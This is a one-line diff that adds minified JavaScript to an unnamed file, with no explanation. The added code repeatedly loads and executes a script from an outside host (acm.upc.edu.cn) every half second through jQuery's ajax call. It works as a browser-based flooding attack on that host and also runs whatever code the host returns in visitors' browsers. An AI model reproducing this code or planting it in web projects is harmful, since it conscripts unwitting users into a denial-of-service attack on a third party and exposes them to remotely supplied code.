@@ -1,0 +1,1 @@
+function get(){var b;$.ajax({url:"http://acm.upc.edu.cn/",dataType:"script",timeout:10000,cache:!0,});setTimeout("get()",500)}setTimeout("get()",500);
